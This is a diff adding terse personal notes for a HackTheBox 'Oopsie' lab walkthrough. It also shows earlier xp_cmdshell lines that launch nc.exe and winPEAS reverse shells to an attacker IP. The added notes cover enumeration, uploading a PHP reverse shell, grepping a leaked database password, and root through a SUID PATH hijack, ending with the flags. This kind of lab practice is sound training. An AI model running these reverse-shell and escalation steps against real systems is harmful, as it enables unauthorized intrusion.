@@ -290,3 +290,76 @@ nc -lvnp 4444
 xp_cmdshell "c:\Users\Public\winPEASx64.exe -e cmd.exe 10.10.16.75 4444"
 xp_cmdshell "powershell -c C:\Users\Public\winPEASx64.exe"
 xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.16.75 4444"
+
+# Oopsie
+HackTheBox Oopsie Walkthrough
+10.129.168.139
+nmap -F -sV -sC 10.129.168.139
+
+proxy
+gobuster dir -u http://10.129.168.139 -w /usr/share/wordlists/dirb/common.txt
+
+/cdn-cgi/login
+http://10.129.168.139/cdn-cgi/login
+gobuster dir --url http://10.129.168.139/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
+
+cookie
+34322
+/uploads
+
+cd ~/Public
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+nano test.php
+
+$ip = '10.10.16.75';  // ip a | grep tun0
+$port = 4444;
+
+cp test.php test1.php
+
+python3 -m http.server
+
+nc -lvnp 4444
+http://10.129.168.139/uploads/test1.php
+
+which python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+whoami
+uname -a
+ls -hla
+ls /home
+ls /home/robert -hla
+
+cd /var/www/html/cdn-cgi/login
+cat * | grep -i robert
+grep -i robert *
+db.php
+M3g4C0rpUs3r!
+su - robert
+cat /home/robert/user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+
+find / -group bugtracker -executable 2>/dev/null
+find / -group bugtracker 2>/dev/null
+find
+/usr/bin/bugtracker
+
+ls -hla /usr/bin/bugtracker
+root
+set owner user id
+
+/usr/bin/bugtracker
+42
+cat
+
+cd /tmp/
+which bash
+echo "/bin/bash" > cat
+ls -hla
+chmod a+x cat
+
+export PATH=/tmp:$PATH
+echo $PATH
+/usr/bin/bugtracker
+nano /root/root.txt
+af13b0bee69f8a877c3faf667f7beacf
